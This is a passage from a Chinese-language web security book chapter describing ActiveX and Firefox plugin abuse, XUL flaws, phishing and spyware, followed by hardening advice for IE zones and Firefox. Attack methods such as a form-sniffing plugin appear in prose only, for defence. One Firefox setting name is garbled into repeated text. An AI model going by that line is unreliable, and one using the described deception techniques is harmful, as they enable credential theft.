“…随机图片，我所喜欢的辣妹。”以媚俗东西吸引一开始抱着轻松浏览目的的人们，Web 站点操作人员应该想象的到，如果拥有更多资源，攻击者可以对一个类似 MySpace 的 Web 应用程序做些什么！

注意 引用一句我们最爱的 Samy 所说的话：“女孩们喜欢那些会攻击电脑的人”。我们只是认为你应该了解这些。

滥用 ActiveX 自从 20 世纪 90 年代中期 Fred McLain 发布了一个可以远程关闭用户的系统的 ActiveX 控件以来，ActiveX 就是安全争论的中心。ActiveX 很容易通过 <OBJECT> 标记嵌入在 HTML 中，控件可以从远程站点或本地系统中加载。这些控件本质上用调用者的权限执行所有的任务，使它们的功能格外强大，同时也是攻击者的一贯目标。基于 “可信” 控件数字签名的微软 Authenticode 系统，是针对恶意控件的主要安全对抗措施（更多关于 ActiveX 和 Authenticode 的信息，请参见 “参考和进一步阅读”）。

传统上，攻击者主要针对那些预先在受害者 Windows 机器上安装好的控件，因为它们已经被认证，不需要明显地提示用户。在 1999 年年中，Georgi Guninski 和 Richard M. Smith 等人就报告，攻击者可以对 ActiveX 控件的“可安全执行脚本”标志进行置位，从而绕过 Authenticode。这只是扩大了可用来实现滥用目的的 ActiveX 控件的攻击面。从攻击者方面来说，所需要做的是找到一个预安装的 ActiveX 控件，执行一些需要权限的功能，比如读取内存或者写文件到硬盘上，这样已经成功了一半了。表 10-1 列出了最近多次被滥用的一些 ActiveX 控件。

Firefox 插件的有害方面 Firefox 的插件在功能上和 IE 的 ActiveX 控件相同。如果某个用户安装了一个恶意插件，该插件可以利用该用户的权限做任何事情。Firefox 对插件的

安全模型也和 ActiveX 非常类似：终端用户最终决定是否安装该插件（想想他们十之八九会选择什么，对，“就让它装吧！”）。对 Firefox 插件进行潜在滥用的一个具体的例子是 azurit 的 FFsniFF，一个简单的 Firefox 插件，它会解析提交的 HTTP 表单中的非空白密码字段，如果发现了这样的字段，则该插件就会发送整个表单到攻击者指定的电子邮件地址（FFsniFF 的链接请参见“参考和进一步阅读”）。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>ActiveX 控件</td><td style='text-align: center; word-wrap: break-word;'>过去的漏洞</td><td style='text-align: center; word-wrap: break-word;'>影响</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>DHTML Editing</td><td style='text-align: center; word-wrap: break-word;'>LoadURL 方法可以违反同源策略</td><td style='text-align: center; word-wrap: break-word;'>读写数据</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Microsoft DDS Library堆内存毁损</td><td style='text-align: center; word-wrap: break-word;'>堆内存毁损</td><td style='text-align: center; word-wrap: break-word;'>作为调用者执行任意代码</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Shape Control</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>JView Profiler</td><td style='text-align: center; word-wrap: break-word;'>堆内存毁损</td><td style='text-align: center; word-wrap: break-word;'>作为调用者执行任意代码</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ADODB.Stream</td><td style='text-align: center; word-wrap: break-word;'>None——用来在攻击 LMZ 后写入数据</td><td style='text-align: center; word-wrap: break-word;'>将任意内容的文件放置在已知位置</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Shell.Application</td><td style='text-align: center; word-wrap: break-word;'>使用 CLSID 来伪装被加载的恶意文件</td><td style='text-align: center; word-wrap: break-word;'>与 ADODB.Stream 相同</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Shell.Explorer</td><td style='text-align: center; word-wrap: break-word;'>文件夹视图拖曳定时攻击（timing attac）</td><td style='text-align: center; word-wrap: break-word;'>与 ADODB.Stream 相同</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>HTML Help</td><td style='text-align: center; word-wrap: break-word;'>.hhp 文件中超长的“Contents file”字段引发基于堆栈的缓冲区溢出</td><td style='text-align: center; word-wrap: break-word;'>作为调用者执行任意代码</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>WebBrowser</td><td style='text-align: center; word-wrap: break-word;'>潜在影响 IE 的所有攻击</td><td style='text-align: center; word-wrap: break-word;'>作为调用者执行任意代码</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>XMLHTTP</td><td style='text-align: center; word-wrap: break-word;'>老的：LMZ 访问新的：none，用来从/到 LMZ 读/下载文件</td><td style='text-align: center; word-wrap: break-word;'>从/到已知位置读/写任意内容</td></tr></table>

而 ActiveX 和 Firefox 插件的主要不同是, 在 Windows 机器上有很多 ActiveX 控件可以被攻击。当然, 随着 Firefox 插件的流行, 这一点会改变的。

注意 安装在 Windows 和 Linux 上的插件都应该因用户而不同。这样可以避免一个用户的插件被用来攻击其他的用户，不要共享账号（比如信息终端或者实验室计算机），也不要使用超级用户账号安装插件。

XUL XUL（XML User Interface Language，XML 用户界面语言，读做“zool”）是一个用户界面标记语言，可以用来操纵诸如 Firefox 和 Thunderbird（Mozilla 的 E-mail 客户端）等 Mozilla 应用程序中用户界面（或者“皮肤”）的某些部分。有人将 XUL 的安全性比做成 IE 中的 LMZ，因为如果存在任何实现中的漏洞，它定义的元素诸如 windows、脚本和数据源，都可以轻易地被利用来违反同源策略。

在 2006 年，“moz_bug_r_a4”报告了在 XULDocument persist()函数中的一个输入验证漏洞，该漏洞允许注入任意 XML 和 JavaScript 代码到 localstore.rdf 文件中，而这段代码会在浏览器启动时，以浏览器权限执行。该功能和一个 IE LMZ 脚本执行漏洞一模一样（虽

然在 Firefox 这个例子中，需要重新启动浏览器）。

XUL 也暗示了可以搞乱 Web 内容的界面。举个例子，在 2004 年年中 Jeff Smith 报告，Firefox 没有限制 Web 站点包含任意远程 XUL，这可以用来劫持大多数用户界面（包括工具栏，SSL 认证对话框，地址栏等等），从而控制几乎用户可见的所有东西。这项能力可以控制 Mozilla 用户界面如此多的方面，具有创建伪造窗口、对话框来欺骗用户的巨大威力（参见下一节“欺骗”）。

#### ☐ 针对设计中的问题的对抗措施

为了缓解刚才我们谈论的问题，IE 用户应该保证他们使用带有 LMZ 锁定功能的 Windows XP Service Pack 2 或更新的系统，并阅读本章后面的“IE 安全区域”一节。你也应该考虑尽快升级到 IE 7，因为它关闭了跨域访问的入侵点。Firefox 用户应该阅读本章后面的“Firefox 安全配置”一节。我们在下面将更详细地讨论 ActiveX 的对抗措施。

ActiveX 对抗措施 用户应该在恰当的 IE 域中限制或禁用 ActiveX（参见本章后面的 “IE 安全区域” 一节）。

对于开发者，不要编写在用户系统上需要特权操作才能执行的“安全可执行脚本”控件。我们同样鼓励开发者查看 SiteLock 工具，虽然它不被微软保证或支持，但可以在 http://msdn.microsoft.com/archive/en-us/samples/internet/components/sitelock/ default.asp 上找到。当把它添加到你的构建环境中时，SiteLock 头可以使 ActiveX 开发者限制访问，从而只在预先确定的域列表里的控件才被认为是安全的。

最近，微软开始通过设置指定控件的所谓的 killt-bit 位，“杀掉”潜在危险的 ActiveX 控件。软件开发者如果只是想使他们的 ActiveX 控件失效，而不是打补丁，可以使用这种方法。个人用户也可以使用“参考和进一步阅读”中描述的 kill-bit 技术，为个别控件手工设置 kill-bit 位，

### 10.2 欺骗

如果攻击者找不到利用的漏洞来进行攻击，那么他们可能会转而使用欺骗（Trickery）。社会工程（Social Engineering）术语已经在安全圈子里使用了多年，用来描述使用引诱和蒙骗来获取对数字信息访问的技术。

近年来，这类攻击已经取得了技术上的飞速发展，而且新的术语已经出现，用来描述这一融合了基本的人类欺骗技术和老练的技术花招的结合体。最近最流行的说法是钓鱼（Phishing），它的本质是用 Internet 技术实现社会工程的攻击。但这并没有减少它的影响力，

据估计，每年给客户带来的损失超过十亿美元，而且还在不断地增长中。

更具攻击性的欺诈是诱引用户安装蒙骗性的软件，诸如广告软件（adware）和间谍软件（spyware），这些术语都是指那些劫持计算机资源强行显示广告，或者监视用户 Web 冲浪习惯（通常用来卖给市场公司）的隐蔽的或蒙骗性的软件。

注意 间谍软件包括其他类别的监视软件，但是在本章中，我们只讨论和 Web 相关的种类。

本节将研究一些经典的攻击和对抗措施，告诉你远离这些诡计的方法。

####  $ ^{*} $ 钓鱼（Phishing）

基于我们对 Anti-Phishing Working Group（APWG）统计数据的评估和我们的直接经验，钓鱼欺骗的常见特征如下：

○ 欺骗的目标是与金融相关的在线用户。

源地址是非法的或无法调查的。

○ 使用让人感到熟悉的商标形象来增加真实感。

☐ 通过紧急事件迫使用户上当。

我们来更仔细地研究各个部分。

钓鱼一般瞄准与金融相关的在线用户，特别是那些在线执行很多金融交易或在线管理金融账号的用户。就像那句著名的话所说，“为什么罪犯抢劫银行？因为钱在那里。”。APWG 的 2005 年 12 月 “钓鱼攻击趋势报告” 指明，89.3% 的钓鱼目标是金融服务，5% 是 ISP，2.5% 是零售业。最常成为目标的受害者包括 Citibank 在线银行的客户，eBay 和 PayPal 的用户，提供网上服务的大型地区性洲际银行，以及那些客户使用信用卡付账的 ISP，比如 AOL 和 Earthlink。所有的这些公司都通过在线金融管理/交易服务支持数以百万计的用户。你是这些机构中的用户吗？那么你可能已经或者很快就会收到一封钓鱼 E-mail 了。

可以想象，钓鱼欺骗者一点也不希望自己被抓住，因此，大部分钓鱼欺骗都是在非法的或无效的源地址上发生的。钓鱼 E-mail 一般将“发件人”地址伪造成不存在的或非法的 E-mail 账号，而且一般通过已攻陷的计算机上的 E-mail 引擎发送，因此通过标准的邮件头检查技术来追踪是无法找到的。类似的，用来让受害者直接输入敏感信息的 Web 站点，是在 Internet 上被攻击后的系统中暂时启用的。APWG 常引用的统计表明，钓鱼站点的平均生命周期只有几天。因此，如果你认为钓鱼可以通过追踪攻击者而简单的制止，那么请三思。

大部分成功的钓鱼攻击还在于使用让人感到熟悉的商标形象来增加真实感。这看起来好像是技术方面的问题，但根本原因完全是人类的欺骗。请看一下图 10-1 中伪装的钓鱼 E-mail，Banner 条和签名行中的图像直接来于 paypal.com 的主页，大大增强了消息的真实

感。消息本身只有几行文本，如果没有伴随的图像，很可能会立即被随手拒绝。该消息中随处可见的商标符号也起到同样的作用。

提示 精明的公司可以定期检查他们 Web 服务器日志的 HTTP Referrer 项, 看是否有伪造的站点指向可信站点的图片, 从而知道他们的顾客是否受到钓鱼攻击了。虽然复制图像也很简单, 但是很多钓鱼站点并不想这么麻烦, 因此他们的行踪就暴露给了他们所冒充的公司。

当然，消息末尾“更新你的记录……”链接会把用户带到与 PayPal 无关的伪造站点，但是它也伪装成类似的很有真实感的影像。很多钓鱼欺骗的链接都会如本文中所拼写的那样，看起来像是指向一个合法的站点，这也是企图伪装成真实感的影像（尽管看起来像，但该邮件的真实链接绝不是到 paypal.com 的）。更离奇的是，更老练的攻击者会使用浏览器漏洞或弹出伪造脚本窗口跨过地址栏，来掩饰真正的位置。比如，“IE 不正确的 URL 规范化”（IE improper URL canonicalization）漏洞，在 2004 年初被钓鱼欺骗者广泛的使用（参见“参考和进一步阅读”）。

最后，再看图 10-1，我们看到了钓鱼者是如何用紧急事件迫使用户上当的例子——“……未更新记录将会导致账号被删除”。PayPal 的用户可能会被此吓倒，不假思考就采取行动。这种手段除了提高消息的整体可信度和影响力，对于成功地实现欺诈也非常关键。因为为了最大化地获得用户信息，需要在最短的时间内驱使最多的用户到达伪造的站点。记住，钓鱼站点通常最多只存活几天。

 </div>

当然，一旦钓鱼者获得受害者的敏感信息，就能进行随心所欲的破坏，会给受害者带来巨大的灾难。身份窃取包括接管账号，也包括使用通过欺诈（比如钓鱼）所获得的信息来开设一个新的账号。即使受害者受到标准金融业的保护，可以减轻或消除其账号未经授权的使用而带来的法律责任，但是他们的信誉和个人名声会被玷污，这需要花费几个月甚至几年来恢复他们的金融信用。

#### ☐ 钓鱼对抗措施

由于此类型欺骗日益盛行（很遗憾），Internet 上到处都是如何避免和响应钓鱼欺骗的建议。我们把发现的最有用的资源列在了“参考和进一步阅读”中。

最近出现了一些新的在线服务，用来帮助终端用户识别钓鱼欺骗。比如，Earthlink 的 ScamBlocker 是其浏览器工具栏的一个组件，当用户浏览一个已知的钓鱼站点时，会给用户提示。该组件对于已知钓鱼站点的列表像杀毒软件更新病毒库一样不断更新。比如，当浏览一个已知站点时，ScamBlocker 的工具栏图标显示一个绿色的翘起的大拇指图标。当浏览不确定的站点时，图标显示一个有阴影的图像，其上会出现一条斜线，下拉菜单会提供额外的选项来获得关于该站点的信息（包括域注册信息——酷！）。ScamBlocker 的工具栏如下所示。

当用户确实打开一个已知钓鱼站点的时候，他们会被重定向到 Earthlink 站点的一个页面上，该页面带有如下的明确警告：

POTENTIALLY FRAUDULENT WEB SITE ALERT

generated by ScamBlocker from EarthLink

You have been redirected to this page by ScamBlocker, from EarthLink.

The Web address you requested is on our list of potentially Dangerous and Fraudulent Web Sites. Those who visit the site may be at high risk for identity theft or other financial losses.

Please do not continue to this potentially risky site. Simply click your browser's  $ \underline{\text{Back}} $ button.

我们认为 Earthlink ScamBlocker 是一个保护用户免遭钓鱼欺骗的创新机制，鼓励读者试验一下（尽管我们希望它可以从整个工具栏中分离出来）。显然，这种观点现在很流行，

因为微软计划在接下来的 IE 补丁包和下一版本 IE 7 中，实现类似的机制。

另外，以明文格式阅读 E-mail 有助于降低钓鱼者关键工具——让人感到熟悉的商标影像——来增加真实感的欺骗效力。另外，明文 E-mail 可以让你看穿伪造的内嵌超链接，因为以明文浏览时，超链接在尖括号里出现（<和>）。举个例子，下面是一个超链接，当以 HTML 浏览时，会作为带有下划线的蓝色内联文本正常出现。

Click  $ \underline{\text{here}} $ to go to our free gift site!

当以明文浏览时，链接则以尖括号出现，如下所示：

Click here <http://www.somesite.com> to go to our free gift site!

最后但也同样重要的是，当处理 Internet 上的所有事务，特别是收到无缘无故的 E-mail 时，我们建议要保持适当的怀疑心。我们的建议是决不点击不请自来的 E-mail 中的超链接。如果你担心该消息其实是无辜的，你可以打开一个新的浏览器窗口，手工输入 URI（比如，www.paypal.com）或者点击你收藏夹中的链接。养成这样的习惯并不困难，并且它极大地降低了被钓的可能性。

### 广告软件和间谍软件

大多数用户都熟悉一类软件，它们的（大部分）行为都是明显的并得到了用户同意。所有阅读本章的人也都熟悉另一类软件，它们明目张胆地执行了那些没有受到用户授权的行为。处于这两种极端情况中间的是广告软件和间谍软件，它们执行的一些操作得到了用户的同意，而另外一些操作又没有经过用户的同意。

广告软件从广义上定义，就是指那些把用户不想要的广告插入到日常电脑活动中的软件。广告软件的最佳例子是当你浏览一个站点时，弹出讨厌的广告使浏览器失去响应。180Solutions 就是这样的一个声名狼藉的公司，使用欺骗软件技术来促进他们的在线广告业务。

间谍软件是专门设计来秘密监视用户行为的软件，通常用于记录用户行为并报告给在线追踪公司，然后公司把该信息卖给广告商或在线服务提供商。公司、私家侦探、司法部门、情报组织、相互猜疑的夫妻等等，也都出于他们自己的目的，合法或不合法地使用间谍软件。

Internet 上有很多的资源，对诸如广告软件和间谍软件等恼人的恶意软件进行分类和描述（参见“参考和进一步阅读”）。我们余下的讨论将涉及常见的间谍软件和广告软件的植入技术，以及如何摆脱它们。

常见的植入技术 广告软件和间谍软件通过两种基本的途径植入到你的机器上：第一

种方法是利用漏洞，这一点我们已经在本章的前面讨论过；第二种是说服用户自愿安装。要到达后一种目的，有很多种方法。相对直接的程序会提供一个简单的安装流程，包括确认安装的选项和详尽的终端用户许可协议（End User License Agreement，EULA）（虽然大部分用户都会忽略这些法规）。另一种极端的方法是完全隐蔽的安装，比如，作为其他软件安装流程的一部分。微软已经颁布了一些有趣的标准，来确定欺骗软件的构成，而且正在它的反恶意软件产品和服务中实现这些标准（参见“参考和进一步阅读”）。

常见的植入位置 间谍软件和广告软件一般通过如下的一种或多种技术来植入自身：

☐ 安装一个可执行文件到磁盘，然后通过一个自启动扩展点（Autostart Extensibility Point，ASEP）来指向它。

☐ 给 Web 浏览器软件安装加载项（add-on）

ASEP 对那些恼人的欺骗性的甚至是明显的恶意软件的扩散起到了非常重要的作用——我们认为，这些软件所使用的隐藏位置，99%都是自启动扩展点。在“参考和进一步阅读”中提供了一些很有用的 ASEP 列表。用户可以用 Windows XP 上的 msconfig 工具，来检查自己系统上的 ASEP（单击“开始”按钮，选择“运行”，输入命令 msconfig）。图 10-2 显示了 msconfig 工具在一个典型的 Windows XP 系统上列举的启动项。

 </div>

ASEP 非常多，而且比一般用户所想象的要复杂（特别是不了解情况下，对 ASEP 的操作会导致系统的不稳定），因此我们不推荐改动它们，除非你知道你自己在做什么。请使用自动化工具，后面我们会推荐一些。

ASEP 的另一种形式是 Web 浏览器加载项，它是一种几乎无形的机制，可以将有用的功能植入到你的 Web 浏览器中。其中最阴险的浏览器加载项机制是浏览器辅助对象（Internet Explorer Browser Helper Object, BHO）特性（参见“参考和进一步阅读”）。直

到 Windows XP SP2，BHO 对用户也是不可见的，而且它能够做 IE 能做的任何事情。提到太校枉过正地使用好的扩展想法——BHO 让我们想到了科学怪人(Frankenstein's monster)。幸运的是，在 XP SP2 中，加载项管理器（在“工具”|“管理加载项”下）现在至少可以列举和控制在 IE 中所运行的 BHO 了。你仍必须手动决定是否需要禁用它们，这是个烦人的工作，因为一些欺骗性的软件不会在 IE 用户界面中提供任何信息来帮助用户做出决定。或者，你可以使用我们接下来所推荐的第三方工具。

#### ☐ 广告软件和间谍软件的对抗措施

对抗烦人的流氓软件的最佳机制之一是从经济层面着手，不要为了交换一些很酷很新的软件小功能（比如 P2P 文件共享工具），就在你的系统上安装广告软件或间谍软件。

你也可以直接用反广告/间谍软件工具来防范。有两个很好的来自德国的工具：来自Lavasoft的Spybot Search & Destroy和Ad-aware，可以从http://www.lavasoft.de站点下载。在非正式的测试中，我们更倾向于Spybot，因为它是免费的，而且在我们的测试系统上，找到了比Ad-aware Personal的免费版本更多的功能。我们也同样喜欢Spybot提供的“免疫”和“恢复”功能，以及工具中集成的通过Internet升级的功能。在图10-3中显示了Spybot正在扫描一个系统。

 </div>

除了刚才提到的免费的反间谍软件程序外，完善的商业市场也发展起来了。由于Webroot的SpySweeper功能的广泛性、易用性和功能集，一直深受好评。另外，大部分处于领先地位的杀毒/安全软件公司，诸如Symantec和McAfee，也提高了反间谍软件的能力。要对各种反间谍软件产品进行比较，只用简单的Google“anti-spyware reviews”便知。

微软从来不会呆在任何软件工业分支之外，它也加入了这场竞争，推出了自己的反间谍软件产品——Windows Defender。Defender 也是免费的，Microsoft 似乎在恶意代码研究上投入了大量的资源以加强该产品。他们也希望发布该产品的在线服务版本——Windows OneCare。该服务会给愿意按月付费的终端用户带来极大的方便，使得所有流氓软件的问题都得到解决。关于 Microsoft 在这一领域提供的各种产品，请参见“参考和进一步阅读”。

### 10.3 通用对抗措施

多年来我们一直在对在线客户端安全从过去到未来所面临的各种挑战进行研究和撰写文章，我们总结出了“加固 Internet 安全体验的十步措施”，包括在本章前面已经详细提到的建议，以及以下这些通用的最佳实践措施。

1．配置个人防火墙，理想的防火墙还应该能够管理出站连接企图。XP SP2 和之后的 Windows 防火墙是一个很好的选择。

2. 保持所有软件安全相关补丁的及时更新。Windows 用户应该设置 Microsoft 自动更新来减轻这一繁重的工作。

3．运行反病毒软件，自动扫描系统（特别是收到的邮件附件）并保持它的更新。我们也推荐运行在本章中讨论过的反广告软件/间谍软件和反钓鱼工具。

4. 精心配置 Windows “Internet 选项” 控制面板（也可以通过 IE 和 Outlook/OE 来访问）。

5. 以低一点的权限运行。绝不要以管理员身份（或者相同的高权限账号）登录到系统来浏览 Internet 或阅读 E-mail。只要可能，都要使用降低权限的浏览器选项。

6. 大型 Windows 系统网络的管理员，应该在网络关键瓶颈点上配置前面提到的技术（比如，除基于主机的防火墙外还要有基于网络的防火墙，邮件服务器上的反病毒软件等等）来有效地保护大数目的用户。

7. 以明文方式阅读 E-mail。

8. 尽可能配置 Office 产品软件的安全性，比如，在 “工具” 菜单 | “宏” | “安全性” 下面设置 Microsoft Office 程序的宏安全级为 “非常高”。

9. 提高警惕，小心上当！高度谨慎地处理基于 Internet 的请求和事务。不要点击来自不信任源的 E-mail 中的链接。

10\. 保持你的计算机设备的物理安全。

关于这些步骤更多信息的链接，参见本章末尾的“参考和进一步阅读”。下面，我们将对本章中没有讨论过的而又在列表里的一些对抗措施做进一步的解释。

#### 10.3.1 IE 安全区域

虽然老套，但我们还是认为安全区域（Security Zones）是 Windows 安全中最易被忽略的方面。好，或许你从未听说过安全区域，或者你不知道安全区域可以如何优雅地管理你的 Internet 体验的安全，但现在你可以知道了。

本质上来说，区域安全模型允许用户给软件行为分配不同的信任等级，有以下四个域：本地 Intranet，受信任的站点，Internet 和受限制的站点。我们已经见过，第五个域叫做本机电脑区域（Local Machine Zone，LMZ），但它不能在用户界面中使用，因为它只能使用特殊的工具或直接修改 Windows 注册表来配置。

可以手动添加站点到除了 Internet 区域以外的所有区域。Internet 区域包含了所有没有放在其他区域中的站点，而且每个站点在其 URL 中包含了一个圆点（.）（例如，http://local 是默认本地 Intranet 区域的一部分，而 http://www.microsoft.com 是在 Internet 区域中，因为它在名字中有圆点）。当你浏览一个区域中的站点时，为该区域指定的安全设置就应用到你在该站点上的行为中（例如，可能允许“运行 ActiveX 控件”）。因此，最重要的配置区域是 Internet 区域，因为它包含了默认情况下用户最可能浏览的所有站点。当然，如果你手动添加站点到其他任何区域，该规则就不会应用。当配置其他区域时，一定要仔细选择受信任站点和受限制的站点——如果你选择了一定要这样做（一般情况下，企业局域网的用户由网络管理员配置其他的区域）。

##### 配置 Internet 区域

为了配置 Internet 区域的安全性, 可以按照如下的步骤进行: 打开 IE 中“工具”I“Internet 选项”I“安全”（或者“Internet 选项”控制面板）, 选择“Internet 区域”, 单击“默认级别”, 然后移动滑动条到正确的位置。我们推荐设置它为高, 然后使用“自定义级别”按钮来手动禁用其他所有的活动内容以及如表 10-2 所示的可用性设置。一些和 ActiveX 相关的 Internet 区域设置如图 10-4 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>分类</td><td style='text-align: center; word-wrap: break-word;'>设置名</td><td style='text-align: center; word-wrap: break-word;'>推荐设置</td><td style='text-align: center; word-wrap: break-word;'>注释</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ActiveX 控件和插件</td><td style='text-align: center; word-wrap: break-word;'>对标记为可安全执行的 ActiveX 控件执行脚本</td><td style='text-align: center; word-wrap: break-word;'>禁用</td><td style='text-align: center; word-wrap: break-word;'>客户认为安全的控件可以被利用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Cookie</td><td style='text-align: center; word-wrap: break-word;'>允许使用每个会话 Cookies（未存储）</td><td style='text-align: center; word-wrap: break-word;'>启用</td><td style='text-align: center; word-wrap: break-word;'>没那么安全，但对用户更友好</td></tr></table>

续表

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>分 类</td><td style='text-align: center; word-wrap: break-word;'>设置名</td><td style='text-align: center; word-wrap: break-word;'>推荐设置</td><td style='text-align: center; word-wrap: break-word;'>注 释</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>下载</td><td style='text-align: center; word-wrap: break-word;'>文件下载</td><td style='text-align: center; word-wrap: break-word;'>启用</td><td style='text-align: center; word-wrap: break-word;'>根据文件的扩展名，IE会自动提示下载</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>脚本</td><td style='text-align: center; word-wrap: break-word;'>活动脚本</td><td style='text-align: center; word-wrap: break-word;'>启用</td><td style='text-align: center; word-wrap: break-word;'>没那么安全，但对用户更友好</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>其他</td><td style='text-align: center; word-wrap: break-word;'>允许 Internet Explorer Web browser 控件的脚本</td><td style='text-align: center; word-wrap: break-word;'>禁用</td><td style='text-align: center; word-wrap: break-word;'>功能强大的 ActiveX 控件，应该被限制使用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>其他</td><td style='text-align: center; word-wrap: break-word;'>允许 META REFRESH</td><td style='text-align: center; word-wrap: break-word;'>禁用</td><td style='text-align: center; word-wrap: break-word;'>可以用来加载不期望的页面</td></tr></table>

 </div>

##### 与受信任站点兼容

遗憾的是，如果禁用了 ActiveX，会导致在浏览那些需要控件做特殊效果的站点时出现问题。对于该问题的一个解决方法是当浏览一个受信任站点时，手动启用 ActiveX，然后再手动关闭。而更聪明点的方法是使用可信的站点区域。为该区域分配一个低级别的安全级（我们推荐中级），并添加受信任站点诸如 windowsupdate.microsoft.com（你下载补丁的站点）。当浏览需要使用 ActiveX 的站点时（诸如 Microsoft 的 Windows 补丁更新站点），低级别的安全设置生效，这样站点的 ActiveX 功能仍然可用。同样的，添加 auto.search.msn.com 到受信任的站点区域中，将支持 IE 的自动搜索功能，会指引浏览器从一个输入的地址比如 mp3，到 http://www.mp3.com 中。安全区域是不是很方便呢？

警告 注意只能添加高可信度的站点到受信任的站点区域中，因为那里对活动内容下载和运行的限制更少。要知道即使是一个看起来很正规的站点，也有可能已经被恶意黑客攻陷，或者某个动机不良的开发者在收集用户数据（甚至更糟）。

##### 阅读 E-mail 时使用锁定的受限制的站点

受限制的站点区域是受信任站点区域的对立面——在这个区域里的站点是完全不可信的，因此对受限制站点的安全设置应该是最严格的。实际上，我们推荐把受限制的站点区域设置成禁用所有的设置。这意味着把安全级别设置成高，然后单击“自定义级别”按钮，手动禁用其高安全级打开的所有选项(如果不能禁用的话，可以把它们设置成“高度安全”)。

你可以不像我们推荐受信任站点那样，把站点分配到受限制的站点区域中。但是，你应该使用受限制站点来执行任何高危险的活动，比如阅读 E-mail（可以认为受限制站点是“安全沙箱”）。幸运的是，你也可以出于安全阅读邮件的目的，对 Outlook/ Outlook Express（OE）进行像分配区域一样的操作。通过 Outlook/OE，你可以选择所希望的区域显示邮件阅读器里内容——Internet 区域或者受限制的站点区域。当然，我们推荐把它设置成完全锁定的受限制的站点区域（大概从 2000 起，这一直是 Outlook 和 OE 的默认值）。图 10-5 显示了如何将 Outlook 配置成受限制的站点。

 </div>

把 Outlook 设置成最受限制级别，会存在与 IE 同样的缺点。但是，活动内容是 E-mail 消息形式中最烦人的，而且解释它所带来的危险性远超过它所带来的美观界面效果。

##### 大规模地管理安全区域

在 Windows XP SP2 前，唯一支持管理大量计算机的安全区域的机制是通过 Internet Explorer 用户界面或者通过 IE 浏览器管理工具包（Internet Explorer Administration Kit,

IEAK）。在 XP SP2 后，安全区域的设置可以通过组策略管理控制台（Group Policy Management Console）来管理，如果设置后，只能通过组策略对象（Group Policy object, GPO）或管理员来更改。当然，组策略需要 Windows Server 活动目录（Windows Server Active Directory），因此这并不是真正轻量级的管理选择，但是我们认为向管理大量 Windows 系统的管理员强调这一点还是很重要的。

#### 10.3.2 Firefox 安全设置

Firefox 用户没有类似 IE 的集中的区域配置界面。最相似的（Firefox 1.5 版本）是在“工具”菜单，“选项”|“内容”下。该界面如图 10-6 所示。

 </div>

在这个界面上，我们推荐选择如图 10-6 所示的选择框。另外，如果要安装软件，用户应该确认只有受信任的站点才能列在“允许的站点”下，而且所有 JavaScript 的“高级…”选项都禁用了（留下“改变图像”可能没有什么问题）。

##### 禁用 XUL 状态元素

因为黑客可能通过 XUL 操纵用户界面, 我们推荐在 Firefox 中禁用特定的 XUL 状态元素。首先, 在 Firefox 的地址栏中输入 about:config, 这会显示一些配置值。为了 XUL 更安全, 把下列值设为真:

o dom.disable_window_open_feature.titlebar

o dom.disable_window_open_feature.close

o dom.disable_window_open_feature.toolbar

o dom.disable_window_open_feature.location

o dom.disable_window_open_feature.directories

dom.disable_window_open_feature.personalbar

o dom.disable_window_open_feature.menubar

o dom.disable_window_open_feature.scrollbars

o dom.disable_window_open_feature.答案是:答案是:答案是:

o dom.disable_window_open_feature.minimizable

o dom.disable_window_open_feature.status

这些参数也可以通过 user.js 文件来设置。

#### 10.3.3 低权限浏览

主流浏览器厂商开始慢慢明白，在很多情况下可能都给 Web 浏览器的权限太大。最近他们开始采取措施，限制他们浏览器软件的权限，以防止其受到不可避免的 0-day 代码的攻击。

##### Firefox 安全模式

Firefox 的安全模式（Safe Mode）是一个精简模式，可用做诊断故障和调试时的模式。因为禁用了有潜在漏洞的插件（extension）和主题（theme），Safe Mode 提供的精简功能也减少了产品所受到的攻击面。

可以通过“安全模式”参数运行 Firefox 可执行程序，来以安全模式启动 Firefox。比如，在 Windows 上，你可以单击“开始”|“运行”，输入下面命令：

"C:\Program Files\Mozilla Firefox\firefox.exe" -safe-mode

标准的 Firefox 安装程序也会创建一个 Windows 快捷方式图标，自动将其封装成简单的一键式启动。

警告 当以安全模式启动 Firefox 时，你应该确认 Firefox 或 Thunderbird 没有在后台运行。Firefox 1.5 和以后的版本，会弹出一个窗口让你知道你确实在以安全模式运行。

##### IE 安全强化机制和保护模式

在 Windows Server 2003 中，微软的 IE 的默认配置在安全强化机制（Enhanced Security Configuration，ESC）中运行。这是有非常多限制的机制，要浏览任何站点，都需要用户交互式的验证。也就是说，用户必须手动地添加每个请求的站点到受信任站点区域，甚至普通活动功能也要这样。虽然对偶尔的 Web 浏览可能带来很糟的用户体验，但这是我们对服

服务器所强烈建议的配置，在服务器上，Web 浏览和 E-mail 阅读应该通过策略禁止。关于 ESC 更多的信息，包括如何使用组策略来实施，请参见“参考和进一步阅读”。

